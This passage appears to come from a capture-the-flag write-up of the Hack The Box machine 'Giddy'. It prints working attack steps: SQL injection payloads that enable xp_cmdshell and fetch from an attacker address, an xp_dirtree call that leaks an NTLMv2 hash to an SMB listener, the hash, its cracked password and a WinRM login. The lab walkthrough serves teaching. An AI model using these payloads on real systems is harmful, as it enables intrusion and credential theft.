+  <li><code class="language-plaintext highlighter-rouge">Injection</code> database has a base64 encoded gzip which is in <code class="language-plaintext highlighter-rouge">gzip compressed data, max speed, from FAT filesystem (MS-DOS, OS/2, NT)</code> format.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>Database: Injection
+Table: __MigrationHistory
+<span class="o">[</span>1 entry]
++-------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------+
+| MigrationId                   | Model                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ProductVersion |
++-------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------+
+| 202108111233184_InitialCreate | H4sIAAAAAAAEAO1azW7jNhC+F+g7CDq1BdZK0j2kgb0Lr5O0QeN4ESd7DWhpbBOlSFWksvaz9dBH6it09EdLomTJ3sTutr3Z5PCbH84PZ+y//viz/37lM+sZQkkFH9invRPbAu4Kj/LFwI7U/M25/f7dt9/0rzx/ZX3K6X6M6fAklwN7qVRw4TjSXYJPZM+nbiikmKueK3yHeMI5Ozn5yTk9dQAhbMSyrP59xBX1IfmCX0eCuxCoiLCx8IDJbB13pgmqdUd8kAFxYWCPNf5QBnegemPwZyjXkga9SQB8GKll75IoYltDRgkKOAU2t63g7cWjhKkKBV9MA6IoYQ/rAHB/TpiETJ2L4G1XjU7OYo0cwrlQCCf4Xhaxta6o7RVaRa1jsRKNB3auEEoeJjoVqJH+V1iXFnDpYygCCNX6HuYZxjAIGHUTCeMF23Laz2xsGnOuO9Z3qsw1TBPfWC+8DRWib9nWNV2Bdwt8oZb6CsZkla+cnp3b1iOn6Ip4SIURbt9FjJEZA03vbBWgTolDy/ALkbfCJewjkfKzCL1cgg9CMCC8He+OPNNFYsSqeV1XYBRJ27oHlhDEmqbergMhI3rS/mNdh8K/F6zgW1WapwcSLkChpKKFcCqi0K2I3Hc2TtzJtTPUQ3k2rjxTr96ntx6Itb7xvsIwKGt8LO65+Y7Jfw8L4Md/Qxq6JVIhd+9RuTlzjGB4oH4JK8XumoE2SeWlM1CeWFozUJ6qumSgoZTCpYmc9SnoqaHKXnHP6ipweq81BsAbjZiicS5A2Qb2D4adO7DRmdlks7Fvmc+pXU1xE34JDBRYQ1clj7kRkS7xaio8SlRewawIIfD47YRPNqlCQrkyUyjlLg0I66hN5fx+mX7PV0yspZa3unMJKLmH6na8/WMrouWtXGPbrfWdQmiYNRvPKDwBYSVqLmfxDqyqpTs9NQXV9Ia1NvHZ6MRGbDRjbh5Cjbg6BiuwBb1NbDNzFcjbslz1cnbIIVrXJjWNm98hczSA1xrdKZunJsVq19g0bE7aseWdndPQ2vXHJAiw+BVavWzFmqZ93ujNdPeGyk8xHFfW9FVaWs1JiZAsoLKLrFHSaxpKFZtlRuLyOvJ8g6xzIOT8uvR0padyfjD+nGWCrt2vGVNmosngr9EIfpzmYnvANg8xIJIOnTAStj16R4JFPu+cA5tw6xJhEbpLomxGN5u1Ira5W5O7nYpNjSRtXK5Rc8tOs7NL6Tzxum5V27bt5FWNCId2qnKDVATd3iy2I+ZNTx1mfT/ZFbVZ1n0c/3XDqtR8FGFLGwcOJqOEVUk0d13KKiWrn5WP9pGlUU9SEtvK7wxfE2upwE9DbPo7GzEK8XslJxgTTucg1YP4DfDtgeXuvDLe3GP06Ejpsf/c/JE/k9BdktBssV+sr38xFk3TwxlVLVj/j+EO7A11U7YXBy8P0V4Fvk7+73yy+v6fGB81Yy2PKFCtY60DzIg2bdWxpjWNbeGXzam+aAi0pRv5OqY+Rxf8QFMeswd+hSlP+g7CoJ0J9Mk0WONdqVvrXYZB2oPb50CtjJumLUcdGVVt22mMsz0RbOnLXmUcZL6Z0XMLfwbA8JN0sYGI/xrAwS35rKa54XORh1FFopzEqEmKYIUgw1DROXEVbrsgZfIrzCfCIiS5wiD0bvgkUkGkUGUMSrYuGiMOwW38k5lXWeb+JEh+HnkJFVBMGhe5Cf8QUeZpua9rHoENEHFs/wy4nt4lpgoFi7VGuhO8I1BmPp2SHsAPGILJCZ+SZ2iWrd2GZYv1LylZhMSXGcbmPH5F9/P81bu/AeTZWszOIgAA | 5.0.0.net45    |
++-------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------+
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Dumping the <code class="language-plaintext highlighter-rouge">gzip</code> file with <code class="language-plaintext highlighter-rouge">-a</code> for ascii text mode and then <code class="language-plaintext highlighter-rouge">-c</code> to print the output on stdout. Doesn’t give anything interesting.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">gzip</span> <span class="nt">-adc</span> abc.gzip
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
+&lt;Edmx <span class="nv">Version</span><span class="o">=</span><span class="s2">"3.0"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/ado/2009/11/edmx"</span><span class="o">&gt;</span>
+  &lt;Runtime&gt;
+    &lt;ConceptualModels&gt;
+      &lt;Schema <span class="nv">Namespace</span><span class="o">=</span><span class="s2">"Microsoft.AspNet.Membership.OpenAuth.Data"</span> <span class="nv">Alias</span><span class="o">=</span><span class="s2">"Self"</span> p4:UseStrongSpatialTypes<span class="o">=</span><span class="s2">"false"</span> xmlns:p4<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/ado/2009/02/edm/annotation"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/ado/2009/11/edm"</span><span class="o">&gt;</span>
+        &lt;EntityType <span class="nv">Name</span><span class="o">=</span><span class="s2">"OpenAuthUserData"</span><span class="o">&gt;</span>
+          &lt;Key&gt;
+            &lt;PropertyRef <span class="nv">Name</span><span class="o">=</span><span class="s2">"ApplicationName"</span> /&gt;
+            &lt;PropertyRef <span class="nv">Name</span><span class="o">=</span><span class="s2">"MembershipUserName"</span> /&gt;
+          &lt;/Key&gt;
+          &lt;Property <span class="nv">Name</span><span class="o">=</span><span class="s2">"ApplicationName"</span> <span class="nv">Type</span><span class="o">=</span><span class="s2">"String"</span> <span class="nv">FixedLength</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">MaxLength</span><span class="o">=</span><span class="s2">"128"</span> <span class="nv">Unicode</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">Nullable</span><span class="o">=</span><span class="s2">"false"</span> /&gt;
+<span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> 
+ <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+<span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+  &lt;Designer&gt;
+    &lt;Connection&gt;
+      &lt;DesignerInfoPropertySet&gt;
+        &lt;DesignerProperty <span class="nv">Name</span><span class="o">=</span><span class="s2">"MetadataArtifactProcessing"</span> <span class="nv">Value</span><span class="o">=</span><span class="s2">"EmbedInOutputAssembly"</span> /&gt;
+      &lt;/DesignerInfoPropertySet&gt;
+    &lt;/Connection&gt;
+    &lt;Options&gt;
+      &lt;DesignerInfoPropertySet&gt;
+        &lt;DesignerProperty <span class="nv">Name</span><span class="o">=</span><span class="s2">"ValidateOnBuild"</span> <span class="nv">Value</span><span class="o">=</span><span class="s2">"False"</span> /&gt;
+        &lt;DesignerProperty <span class="nv">Name</span><span class="o">=</span><span class="s2">"CodeGenerationStrategy"</span> <span class="nv">Value</span><span class="o">=</span><span class="s2">"None"</span> /&gt;
+        &lt;DesignerProperty <span class="nv">Name</span><span class="o">=</span><span class="s2">"ProcessDependentTemplatesOnSave"</span> <span class="nv">Value</span><span class="o">=</span><span class="s2">"False"</span> /&gt;
+      &lt;/DesignerInfoPropertySet&gt;
+    &lt;/Options&gt;
+    &lt;Diagrams /&gt;
+  &lt;/Designer&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Overall got nothing interesting.</p>
+
+<h1 id="xp_dirtree---ntlmv2-hash-leak">xp_dirtree - NTLMv2 Hash leak</h1>
+<p>Since the MS-SQL server was also vulnerable to stack queries: <code class="language-plaintext highlighter-rouge">Microsoft SQL Server/Sybase stacked queries</code>.
+That means, I can just append queries at the end.</p>
+
+<h2 id="basic-enumeration">Basic Enumeration</h2>
+<p>Since, I cannot get output of any command (Blind injection). I cannot get the permissions I have. Cannot check if I’m the DBA or not, privileges I have etc.</p>
+
+<p>FYI Check current user is admin or not:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="n">name</span><span class="p">,</span><span class="n">sysadmin</span> <span class="k">from</span> <span class="n">syslogin</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Current user’s permissions:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">'SERVER'</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="xp_cmdshell-fail">xp_cmdshell (FAIL)</h2>
+<ul>
+  <li>
+    <p>Let’s jump straight to <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>
+Payload used: <code class="language-plaintext highlighter-rouge">8;exec xp_cmdshell 'powershell iwr http://10.10.14.6' --</code>
+Didn’t work. Maybe xp_cmdshell isn’t enabled.</p>
+  </li>
+  <li>
+    <p>Enabling <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>:</p>
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="c1">-- this turns on advanced options and is needed to configure xp_cmdshell</span>
+<span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span> <span class="s1">'1'</span>
+<span class="n">RECONFIGURE</span>
+<span class="c1">-- this enables xp_cmdshell</span>
+<span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="s1">'1'</span> 
+<span class="n">RECONFIGURE</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>Payload used:</p>
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="mi">8</span><span class="p">;</span><span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">;</span><span class="n">RECONFIGURE</span><span class="p">;</span> <span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">;</span><span class="n">RECONFIGURE</span><span class="p">;</span> <span class="k">exec</span> <span class="n">xp_cmdshell</span> <span class="s1">'powershell iwr http://10.10.14.6'</span><span class="p">;</span><span class="c1">--</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>Didn’t work. We aren’t DBA.</p>
+  </li>
+</ul>
+
+<h2 id="xp_dirtree">xp_dirtree</h2>
+<p>This will display a list of every folder, every subfolder, and every file for path you give it.
+<strong>BUT</strong>
+I can extract the NTLM hash of the user making the service authentication. For that start a SMB server to capture the hash used in the authentication (impacket-smbserver or responder for example).
+Payload: <code class="language-plaintext highlighter-rouge">8;exec xp_dirtree '\\10.10.14.6';--</code>
+URL: <code class="language-plaintext highlighter-rouge">http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=8;exec%20xp_dirtree%20%27\\10.10.14.6\share\file%27--;</code></p>
+
+<p>SMBServer received:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>smbserver.py share <span class="nb">.</span>
+Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.104,49720<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\S</span>tacy authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stacy::GIDDY:4141414141414141:d1a8bea31d3e8b7daeea4ea8957b541a:010100000000000080dac0875290d701038979ba18ae513300000000010010006800720054004a0043007100670066000200100065004c0077004d005a0045004b004e00030010006800720054004a0043007100670066000400100065004c0077004d005a0045004b004e000700080080dac0875290d701060004000200000008003000300000000000000000000000003000005e123cf532680873906dfa81aa6d95564bb9b1473c76c48a747a17f48fa917990a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Cracking the hash with <code class="language-plaintext highlighter-rouge">john</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+xNnWo6272k7x     <span class="o">(</span>Stacy<span class="o">)</span>
+1g 0:00:00:02 DONE <span class="o">(</span>2021-08-12 16:28<span class="o">)</span> 0.3703g/s 995934p/s 995934c/s 995934C/s xabeoild1..x997ptw<span class="o">=</span>
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Trying to get a shell with the creds on WinRM:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">evil-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">giddy.htb</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">stacy</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">xNnWo6272k7x</span><span class="w">
+</span><span class="n">Evil-WinRM</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">v2.3</span><span class="w">
+</span><span class="n">Info:</span><span class="w"> </span><span class="nx">Establishing</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">endpoint</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+
+</span><span class="n">USER</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------</span><span class="w">
+</span><span class="n">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">   </span><span class="nx">SID</span><span class="w">
+</span><span class="o">===========</span><span class="w"> </span><span class="o">=============================================</span><span class="w">
+</span><span class="n">giddy\stacy</span><span class="w"> </span><span class="nx">S-1-5-21-537587684-3058778966-1023884943-1000</span><span class="w">
+
+</span><span class="n">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">-----------------</span><span class="w">
+</span><span class="n">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                             </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">          </span><span class="nx">Attributes</span><span class="w">
+</span><span class="o">======================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span><span class="w">
+</span><span class="n">Everyone</span><span class="w">                               </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-1-0</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">BUILTIN\Remote</span><span class="w"> </span><span class="nx">Management</span><span class="w"> </span><span class="nx">Users</span><span class="w">        </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-580</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">BUILTIN\Users</span><span class="w">                          </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-545</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NETWORK</span><span class="w">                   </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-2</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Authenticated</span><span class="w"> </span><span class="nx">Users</span><span class="w">       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-11</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\This</span><span class="w"> </span><span class="nx">Organization</span><span class="w">         </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-15</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Local</span><span class="w"> </span><span class="nx">account</span><span class="w">             </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-113</span><span class="w">    </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NTLM</span><span class="w"> </span><span class="nx">Authentication</span><span class="w">       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-64-10</span><span class="w">  </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">Mandatory</span><span class="w"> </span><span class="nx">Label\Medium</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">Level</span><span class="w"> </span><span class="nx">Label</span><span class="w">            </span><span class="nx">S-1-16-8192</span><span class="w">
+
+</span><span class="n">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------------</span><span class="w">
+</span><span class="n">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
+</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span><span class="w">
+</span><span class="n">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+</span><span class="o">-</span><span class="w"> 
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I can also access the shell on web at <code class="language-plaintext highlighter-rouge">/remote</code> .</p>
+<h1 id="privesc-x-dll-hijacking-service-exploit">Privesc x DLL Hijacking (Service Exploit)</h1>
+<p>If I list directories in Documents:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">
+
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\Stacy\Documents</span><span class="w">
+</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">6</span><span class="n">/17/2018</span><span class="w">   </span><span class="nx">9:36</span><span class="w"> </span><span class="nx">AM</span><span class="w">              </span><span class="nx">6</span><span class="w"> </span><span class="nx">unifivideo</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Seems like a service.</p>
+
+<p>Let’s check what services are running:
+Commands that didn’t work:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="n">net</span><span class="w"> </span><span class="nx">start</span><span class="w">
+</span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s1">'sc query state=all'</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_Service</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Let’s look specifically for a service named <code class="language-plaintext highlighter-rouge">unifivideo</code> in service registry:</p>
+<ul>
+  <li>Listing name of the service
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="nx">HKLM:\system\currentcontrolset\services</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select-string</span><span class="w"> </span><span class="s1">'unifivideo'</span><span class="w">
+</span><span class="n">HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UniFiVideoService</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Checking properties of <code class="language-plaintext highlighter-rouge">UniFiVideoService</code>:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
